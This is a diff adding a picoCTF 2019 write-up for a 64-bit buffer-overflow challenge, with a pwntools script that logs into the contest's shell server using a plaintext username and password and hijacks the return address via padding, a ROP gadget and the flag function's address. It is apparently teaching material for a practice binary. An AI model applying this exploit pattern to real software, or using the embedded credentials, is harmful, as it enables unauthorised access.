@@ -219,3 +219,45 @@ print io.recv()
 
 [Return to Top](#picoctf19)
 ***
+
+##  New Overvflow<a name="newoverflow"></a>
+
+> ### Problem
+>> Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return 
+>> address to the flag function in this program. You can find it in /problems/newoverflow-1_2_706ae8f01197e
+>> 5dbad939821e43cf123 on the shell server. [(Source)](https://github.com/Ordered-Chaos/Pwnfolio/blob/master/Pico_CTF(2019)/Sources/newoverflow.md#newoverflowsource1)
+
+> ### Solution
+>>
+>>
+>>
+~~~python
+#!/usr/bin/python
+
+from pwn import *
+
+# elf = context.binary = ELF('vuln')
+context.update(os='linux', arch='amd64')
+context.log_level = 'info'
+
+s = ssh(host='2019shell1.picoctf.com', user='Intrinsic', password='Kanoa2019')
+
+io = s.process('vuln',cwd='/problems/newoverflow-1_2_706ae8f01197e5dbad939821e43cf123')
+
+# io = process(elf.path)
+
+padding = cyclic(cyclic_find('saaa'))          # location of pattern match @ rsp
+rop = p64(0x004008c4)
+flag = p64(0x00400767)                         # address of flag function
+
+payload = padding
+payload += rop
+payload += flag
+
+
+# gdb.attach(io, gdbscript = 'b* main')
+
+io.sendline(payload)
+
+print io.recvall()
+~~~
